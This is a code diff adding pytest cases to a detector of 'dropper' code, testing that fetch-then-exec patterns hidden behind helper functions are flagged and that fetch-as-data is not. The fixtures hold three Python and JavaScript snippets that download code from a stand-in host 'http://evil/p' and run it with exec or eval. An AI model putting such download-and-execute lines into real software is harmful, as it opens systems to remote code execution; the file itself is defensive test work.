@@ -75,6 +75,25 @@ def test_dataflow_proven_dropper_js(tmp_path):
     assert "BP-DROPPER" in {f.get("composition") for f in compose_mcd(obs, inv)}
 
 
+@pytest.mark.parametrize("name,src", [
+    # the download hides in a helper the sink calls: exec(fetch(u)) / eval(pull(u))
+    ("loader.py", 'import urllib.request\ndef fetch(u):\n    return urllib.request.urlopen(u).read().decode()\nexec(fetch("http://evil/p"))\n'),
+    ("loader.js", 'const https=require("https");\nfunction pull(u){ return https.get(u); }\neval(pull("http://evil/p"));\n'),
+    ("arrow.js", 'const https=require("https");\nconst pull = (u) => https.get(u);\neval(pull("http://evil/p"));\n'),
+])
+def test_wrapped_function_dropper(tmp_path, name, src):
+    comps, _ = _comps(tmp_path, name, src)
+    assert "BP-DROPPER" in comps
+
+
+def test_wrapped_helper_returning_data_is_not_a_dropper(tmp_path):
+    # A helper that fetches but whose result is used as DATA (not exec) is not a dropper.
+    comps, _ = _comps(
+        tmp_path, "ok.py",
+        'import requests\ndef load(u):\n    return requests.get(u).json()\nd = load("https://api/x")\nprint(d["k"])\n')
+    assert "BP-DROPPER" not in comps
+
+
 def test_fetch_to_data_use_is_not_a_dropper(tmp_path):
     # Fetched value used as DATA (not exec) must not be a dropper.
     (tmp_path / "ok.py").write_text(
